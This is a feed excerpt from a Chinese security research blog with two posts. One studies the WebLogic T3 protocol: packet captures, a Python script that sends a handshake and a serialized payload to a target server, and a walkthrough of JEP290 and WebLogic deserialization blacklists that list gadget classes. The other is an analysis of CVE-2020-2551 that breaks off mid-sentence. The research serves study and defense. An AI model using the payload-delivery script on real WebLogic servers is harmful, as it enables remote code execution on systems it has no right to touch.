target="_blank" rel="noopener">从栈溢出开始，教你写Shellcode和ROP链</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好久没更新，菜鸡学 pwn&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn" scheme="https://blog.sari3l.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic T3 协议学习</title>
    <link href="https://blog.sari3l.com/posts/ecb4dfa2/"/>
    <id>https://blog.sari3l.com/posts/ecb4dfa2/</id>
    <published>2020-04-01T08:16:44.000Z</published>
    <updated>2020-07-06T09:45:06.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="How-to-Implement-WebLogic-RMI"><a href="#How-to-Implement-WebLogic-RMI" class="headerlink" title="How to Implement WebLogic RMI"></a>How to Implement WebLogic RMI</h2><p>首先构造 rmi 服务端，以便观察数据包</p><p>根据<a href="https://docs.oracle.com/middleware/1213/wls/WLRMI/rmi_imp.htm#WLRMI146" target="_blank" rel="noopener">官方文档</a>，直接生成 jar 包</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15852292974954.jpg" alt="-w775"></p><p>将生成的jar包放到测试domain的lib目录下</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15852293246061.jpg" alt="-w752"></p><p>将目标<code>server</code>类配置为启动类</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15852293730424.jpg" alt="-w988"></p><p>重启 weblogic 后即可进行调用</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15852294460930.jpg" alt="-w666"></p><h2 id="流量解析"><a href="#流量解析" class="headerlink" title="流量解析"></a>流量解析</h2><p>红色部分为 request<br>蓝色部分为 response</p><p>P.S. 此节当时用了12.1.3.0.0版本，本文其他内容均为12.2.1.4.0版本</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15852305401102.jpg" alt="-w1120"></p><p>通过<code>ac ed 00 05</code>筛选出请求反序列化部分依次为</p><pre class=" language-plain"><code class="language-plain">weblogic.rjvm.ClassTableEntryweblogic.rjvm.ClassTableEntryweblogic.rjvm.ClassTableEntryweblogic.rjvm.JVMIDweblogic.rjvm.JVMID---weblogic.rjvm.ClassTableEntryweblogic.rjvm.ImmutableServiceContext---weblogic.rjvm.ImmutableServiceContext</code></pre><h2 id="T3-协议利用"><a href="#T3-协议利用" class="headerlink" title="T3 协议利用"></a>T3 协议利用</h2><p>根据数据包请求内容，我们主体需要分为两部分进行发送</p><ol><li><p>握手🤝</p><pre class=" language-plain"><code class="language-plain"> t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://10.211.55.20:7001\nLP:DOMAIN\n\n</code></pre></li><li><p>序列化数据</p><p> 这里涉及两种方式，实际上也算是同一种</p><ol><li><p>将上面提到的序列化部分其中一项改为恶意 payload</p></li><li><p>取消所有序列化部分，在下面数据后直接拼接恶意 payload</p><pre><code>000005fe016501ffffffffffffffff000000710000ea60000000184f0fb5416958bf21f2810099d59af6a410012655b1f4c837027973720078720178720278700000000c00000002000000000000000400000001007070707070700000000c00000002000000000000000400000001007006fe010000</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15852751007483.jpg" alt="-w647"></p></li></ol></li></ol><p>最简单的情况当然是后者，下面是利用脚本，注意头 4 字节为数据总长度</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> struct<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        server <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>server<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Handshake</span>        handshake <span class="token operator">=</span> b<span class="token string">"t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://10.211.55.20:7001\nLP:DOMAIN\n\n"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>] Sending: %s"</span> <span class="token operator">%</span> handshake<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>handshake<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Receive</span>        message <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;] Receive: %s"</span> <span class="token operator">%</span> message<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Send Payload</span>        Obj <span class="token operator">=</span> open<span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> b<span class="token string">"\x00\x00\x05\xfe\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x0f\xeb\x30\x46\x27\x2d\x8c\xc7\x52\x16\xbb\xd1\x9e\x42\x00\xdc\x6a\x8e\x80\xbe\xbb\x7e\xd5\xbe\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00"</span>        payload <span class="token operator">+=</span> Obj        payload <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># print("[*] Sending Payload: %s" % payload)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>] Sending Payload ..."</span><span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Receive</span>        message <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;] Receive: %s"</span> <span class="token operator">%</span> message<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] Error: %s"</span> <span class="token operator">%</span> e<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: python t3protocol.py 127.0.0.1 7001 payload.bin"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    send<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="T3-解析过程"><a href="#T3-解析过程" class="headerlink" title="T3 解析过程"></a>T3 解析过程</h2><p>为了下断点，先将 src.zip 加入到 Classpath 中</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15853030550115.jpg" alt="-w662"></p><pre class=" language-plain"><code class="language-plain">readObject:71, BadAttributeValueExpException (javax.management)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)invokeReadObject:1158, ObjectStreamClass (java.io)readSerialData:2173, ObjectInputStream (java.io)readOrdinaryObject:2064, ObjectInputStream (java.io)readObject0:1568, ObjectInputStream (java.io)readObject:428, ObjectInputStream (java.io)readObject:73, InboundMsgAbbrev (weblogic.rjvm)read:45, InboundMsgAbbrev (weblogic.rjvm)readMsgAbbrevs:325, MsgAbbrevJVMConnection (weblogic.rjvm)init:219, MsgAbbrevInputStream (weblogic.rjvm)dispatch:557, MsgAbbrevJVMConnection (weblogic.rjvm)dispatch:666, MuxableSocketT3 (weblogic.rjvm.t3)dispatch:397, BaseAbstractMuxableSocket (weblogic.socket)readReadySocketOnce:993, SocketMuxer (weblogic.socket)readReadySocket:929, SocketMuxer (weblogic.socket)process:599, NIOSocketMuxer (weblogic.socket)processSockets:563, NIOSocketMuxer (weblogic.socket)run:30, SocketReaderRequest (weblogic.socket)execute:43, SocketReaderRequest (weblogic.socket)execute:147, ExecuteThread (weblogic.kernel)run:119, ExecuteThread (weblogic.kernel)</code></pre><p>具体过程可见<a href="https://www.anquanke.com/post/id/201432#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201432#h2-3</a><br>不再赘述</p><h2 id="过滤机制"><a href="#过滤机制" class="headerlink" title="过滤机制"></a>过滤机制</h2><h3 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a><a href="https://openjdk.java.net/jeps/290" target="_blank" rel="noopener">JEP290</a></h3><blockquote><p>JEP290主要描述了这么几个机制：</p><ol><li>提供一个限制反序列化类的机制，白名单或者黑名单</li><li>限制反序列化的深度和复杂度</li><li>为RMI远程调用对象提供了一个验证类的机制</li><li>定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器</li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15853581669600.jpg" alt="-w499"></p><h3 id="1-filterCheck-in-JDK"><a href="#1-filterCheck-in-JDK" class="headerlink" title="1. filterCheck in JDK"></a>1. filterCheck in JDK</h3><p>我们通过在8u151版本下实现RMI，并尝试用cc3反序列化来查看机制如何进行过滤</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15853596960053.jpg" alt="-w617"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15853599930145.jpg" alt="-w715"></p><p>跟入 checkInput，serialFilter为<code>sun.rmi.registry.RegistryImpl</code>对象，所以实际进入到<code>rt.jar!sun.rmi.registry.RegistryImpl#registryFilter</code>进行过滤</p><p>可以看到对深度、数组大小和基本类型做了判断</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15853607916582.jpg" alt="-w925"></p><p>以及最后的这段</p><pre class=" language-java"><code class="language-java">String<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">!=</span> var2 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Proxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UnicastRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIClientSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIServerSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ActivationID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">?</span> Status<span class="token punctuation">.</span>REJECTED <span class="token operator">:</span> Status<span class="token punctuation">.</span>ALLOWED<span class="token punctuation">;</span></code></pre><p>直接禁用了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，所以返回了<code>Status.REJECTED</code></p><hr><p>“JSON反序列化之殇_看雪安全开发者峰会”的时序图</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15855538532354.jpg" alt></p><h3 id="2-Weblogic-without-JEP290"><a href="#2-Weblogic-without-JEP290" class="headerlink" title="2. Weblogic without JEP290"></a>2. Weblogic without JEP290</h3><p>通过上面在 JDK 中的抵用栈信息，可以看到在 weblogic 中是通过<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code>进入的<code>java.io.ObjectInputStream</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854721866812.jpg" alt="-w951"></p><p>我们跟进ServerChannelInputStream看一下</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854737021432.jpg" alt="-w1344"></p><p>再看一下<code>ServerChannelInputStream</code>的继承关系</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854751893169.jpg" alt="-w626"></p><p>即<code>ServerChannelInputStream</code>继承自FilteringObjectInputStream，并通过重写resolveClass、resolveProxyClass从而进行反序列化过滤防御</p><p>我们跟进checkLegacyBlacklistIfNeeded看一下，到这<code>weblogic.utils.io.oif.WebLogicObjectInputFilter#checkLegacyBlacklistIfNeeded</code>会根据是否支持JEP290自带过滤，在不可用情况下会使用<code>isBlacklistedLegacy</code>进行防御</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854755062154.jpg" alt="-w781"></p><p>至于哪里调用JEP290过滤先放一边，我们先看下isBlacklistedLegacy</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854757085240.jpg" alt="-w786"></p><p>如果类名第一个字符为<code>[</code>（数组），或为primitiveTypes中的某项，就不会进行检测</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854758262158.jpg" alt="-w1124"><br>之后会检查类型类名、包名是否在LEGACY_BLACKLIST中，有一项不符即回到上面抛出异常</p><p>我们看看LEGACY_BLACKLIST是怎么来的</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854765156752.jpg" alt="-w917"></p><p>跟进<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>可以发现 BLACKLIST 取决于constructLegacyBlacklist方法，考虑上下文追溯至<code>processLegacyBlacklistProperties</code>，因为我们考虑的是不支持 JEP290 的情况，所以进入到最后的 else 分支中</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854767314187.jpg" alt="-w1201"></p><p>所以 BLACKLIST 来源主要来自以下三处</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_BLACKLIST_PACKAGES <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"org.apache.commons.collections.functors"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax"</span><span class="token punctuation">,</span> <span class="token string">"javassist"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.activation"</span><span class="token punctuation">,</span> <span class="token string">"sun.rmi.server"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.builder"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.reader"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.proxy"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.spi.metadata"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.spi.model"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj.annotation"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj.autoproxy"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.beans.factory.support"</span><span class="token punctuation">,</span> <span class="token string">"org.python.core"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_BLACKLIST_CLASSES <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"org.codehaus.groovy.runtime.ConvertedClosure"</span><span class="token punctuation">,</span> <span class="token string">"org.codehaus.groovy.runtime.ConversionHandler"</span><span class="token punctuation">,</span> <span class="token string">"org.codehaus.groovy.runtime.MethodClosure"</span><span class="token punctuation">,</span> <span class="token string">"org.springframework.transaction.support.AbstractPlatformTransactionManager"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.UnicastRemoteObject"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.RemoteObjectInvocationHandler"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.RemoteObject"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"weblogic.rmi.blacklist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="3-JEP290-in-Weblogic"><a href="#3-JEP290-in-Weblogic" class="headerlink" title="3. JEP290 in Weblogic"></a>3. JEP290 in Weblogic</h3><p>回到 JEP290 调用栈，我们知道最后是调用filterCheck进行的过滤</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854773851473.jpg" alt="-w1332"></p><p>跟入，此时serialFilter为sun.misc.ObjectInputFilter对象（注意 JDK 为8u151）</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854775780406.jpg" alt="-w1642"></p><pre class=" language-plain"><code class="language-plain">maxdepth=100;!org.codehaus.groovy.runtime.ConvertedClosure;!org.codehaus.groovy.runtime.ConversionHandler;!org.codehaus.groovy.runtime.MethodClosure;!org.springframework.transaction.support.AbstractPlatformTransactionManager;!java.rmi.server.UnicastRemoteObject;!java.rmi.server.RemoteObjectInvocationHandler;!com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager;!java.rmi.server.RemoteObject;!org.apache.commons.collections.functors.*;!com.sun.org.apache.xalan.internal.xsltc.trax.*;!javassist.*;!java.rmi.activation.*;!sun.rmi.server.*;!org.jboss.interceptor.builder.*;!org.jboss.interceptor.reader.*;!org.jboss.interceptor.proxy.*;!org.jboss.interceptor.spi.metadata.*;!org.jboss.interceptor.spi.model.*;!com.bea.core.repackaged.springframework.aop.aspectj.*;!com.bea.core.repackaged.springframework.aop.aspectj.annotation.*;!com.bea.core.repackaged.springframework.aop.aspectj.autoproxy.*;!com.bea.core.repackaged.springframework.beans.factory.support.*;!org.python.core.*</code></pre><p>看上面过滤的类是不是很熟悉，实际也是<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>生成的 filter</p><p>跟入<code>sun.misc.ObjectInputFilter.Config.Global#checkInput</code>，整体代码和registryFilter中的类似，红框处是进行serialFilter黑名单匹配</p><blockquote><p>这里用到了 Function&lt;T, U&gt; 接口和 lambda 语法</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15854876431547.jpg" alt="-w1608"></p><p>下面是 filter 通过生解析生成过程，需要在 weblogic 启动时下断点观察，传入的值和serialFilter是一致的</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/ecb4dfa2/15855527639904.jpg" alt="-w1400"></p><p>如果返回 null 或者 REJECTED 都会抛出异常结束反序列化流程</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.anquanke.com/post/id/201432" target="_blank" rel="noopener">Weblogic t3 协议利用与防御</a></li><li><a href="https://paper.seebug.org/728/" target="_blank" rel="noopener">从WebLogic看反序列化漏洞的利用与防御</a></li><li><a href="https://paper.seebug.org/454/" target="_blank" rel="noopener">反序列化漏洞的末日？JEP290机制研究</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Docker with Weblogic 12.2.1.4.0&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2551 简单分析</title>
    <link href="https://blog.sari3l.com/posts/e32c5d3e/"/>
    <id>https://blog.sari3l.com/posts/e32c5d3e/</id>
    <published>2020-03-20T04:43:47.000Z</published>
    <updated>2020-07-06T09:45:26.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><ul><li>jdk 8u151</li><li>weblogic 12.1.4.0</li></ul><ol><li>通过<a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">此项目</a>直接生成 docker 并启动，同时根据项目说明添加 Remote 方便进行 debug</li><li>进入 docker 拷贝出以下文件并添加至 poc 项目 Libraries<ul><li>modules/com.bea.core.repackaged.springframework.spring.jar</li><li>server/lib/wlfullclient.jar</li></ul></li></ol><p>注意：wlfullclient.jar在12.1.3版本后被移除，<a href="https://docs.oracle.com/en/middleware/fusion-middleware/weblogic-server/12.2.1.4/saclt/jarbuilder.html#GUID-FEFB26AB-0D48-4D86-BDE2-FDC04F7CE993" target="_blank" rel="noopener">点此查看具体信息</a>，但可以通过以下命令生成</p><pre class=" language-shell"><code class="language-shell">cd WL_HOME/server/libjava -jar wljarbuilder.jar</code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15844996931979.jpg" alt="-w1072"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846793440437.jpg" alt></p><p>IIOP 协议看的头疼，只好按流程说一下</p><p>每个 IIOP 数据包都会进入<code>weblogic.iiop.ConnectionManager#dispatch</code>进行解析，长度<code>end</code>对应数据对应原始包中数据</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846250356635.jpg" alt="-w1917"></p><p>直到收到 bind_any 的数据包（这里 wireshark 标记数据有些问题）</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846279285782.jpg" alt="-w959"></p><p>之后<code>weblogic.rmi.internal.wls.WLSExecuteRequest#run</code>进入<code>weblogic.rmi.internal.BasicServerRef#handleRequest</code>解析请求数据，如果userIdentity、action均不为null（均不用在意），会依次进入</p><ul><li><code>weblogic.rmi.cluster.ClusterableServerRef#invoke</code></li><li><code>weblogic.corba.idl.CorbaServerRef#invoke</code><br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846285113448.jpg" alt="-w891"></li></ul><p>如果method不为objectMedthods之一（定义在CorbaServerRef最底部），则会进入<code>this.delegate._invoke</code>即<code>weblogic.corba.cos.naming._NamingContextAnyImplBase#_invoke</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846290493783.jpg" alt="-w1224"></p><p>通过判断 method 进入对应流程 case，这里进入 case 0</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846296787933.jpg" alt="-w1209"></p><p>这里通过<code>WNameHelper.read(InputStream istream)</code>读取配置并进行注册，在读取long型数据时会进行4 bytes 对齐</p><p>红色部分为注册个数，黑色部分为对齐忽略部分，橘色为 key，绿色为 value，分别对应<code>id</code>和<code>kind</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846330998516.jpg" alt="-w549"></p><p>然后关注<code>$result</code>是如何产生的，先后跟入</p><ul><li><code>weblogic.iiop.IIOPInputStream#read_any</code></li><li><code>weblogic.corba.idl.AnyImpl#read_value</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846341639516.jpg" alt="-w478"></p><p>首先通过读取类型为<code>1d</code>后，将输入流进行解析</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846341990330.jpg" alt="-w838"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846339190984.jpg" alt="-w552"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846341251085.jpg" alt="-w586"></p><p>之后进入通过设置 type 进入<code>weblogic.corba.idl.AnyImpl#read_value</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846343594879.jpg" alt="-w703"></p><p>之后跟入<code>weblogic.corba.idl.AnyImpl#read_value_internal</code>，这里会根据 type 类型(29)尝试获取数据</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846347052690.jpg" alt="-w676"></p><p>这里会进入<code>weblogic.iiop.IIOPInputStream#read_value()</code>，看到序列化的标志</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846347768580.jpg" alt="-w415"></p><p>首先会读取 valueTag，（这里出现的<code>getIndirectionValue</code>不知道能不能利用，下来看看），通过查找是否已经有过对应 codebase 避免重复获取，如若没有则会通过之后的数据获取RMI注册表信息</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846754165917.jpg" alt="-w862"></p><p>对应位置如下，黄绿色为 